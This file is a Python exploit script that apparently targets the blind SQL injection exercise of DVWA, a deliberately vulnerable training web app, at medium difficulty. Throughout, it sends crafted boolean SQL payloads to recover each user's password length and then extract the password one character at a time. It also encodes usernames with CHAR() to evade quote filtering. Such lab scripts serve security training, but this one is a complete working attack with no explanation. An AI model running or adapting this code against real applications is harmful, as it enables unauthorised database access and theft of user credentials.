#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from conf import USERS, ALPHABET
from util import http_get, http_post

DIFFICULTY = "medium"

def sqli_blind_medium(base_url):
    global USERS
    
    url = base_url + "/vulnerabilities/sqli_blind/"    
    for user in USERS:
        password_length = get_password_length(url, user)
        print(f"[INFO] - Password for username: {user} has {password_length} length")
        password = get_password(url, user, password_length)

# -----
        
def get_password_length(url, user):
    global DIFFICULTY
    
    username_sql = encode_user_condition(user)
    
    MAX_LENGTH = 100
    for i in range(1, MAX_LENGTH):
        sql_payload = f"1 AND (select 1 from users where {username_sql} and LENGTH(password) > {i}) = 1 #"
        data = f"id={sql_payload}&Submit=Submit"
        r = http_post(url, DIFFICULTY, data=data)
        if "MISSING" in r.text:
            return i

# -----

def get_password(url, username, password_length):
    global DIFFICULTY, ALPHABET

    print(f"[INFO] - Password for {username} is ", end="")
    
    username_sql_code = encode_user_condition(username)
    password = ""
    for i in range(1, password_length + 1):
        for c in ALPHABET:
            sql_payload = f"1 AND (select substring(password, {i}, 1) from users where {username_sql_code}) = CHAR({ord(c)}) #"
            data = f"id={sql_payload}&Submit=Submit"
            r = http_post(url, DIFFICULTY, data=data)
            if not "MISSING" in r.text:
                password += c
                print(c, end="", flush=True)
                break

    print("\n", end="")
    return password

# -----
        
def encode_user_condition(user):
    sql = ""
    for i, c in enumerate(user):
        sql += f"substring(first_name, {i+1}, 1) = CHAR({ord(c)}) AND "
    return sql[:-5]        
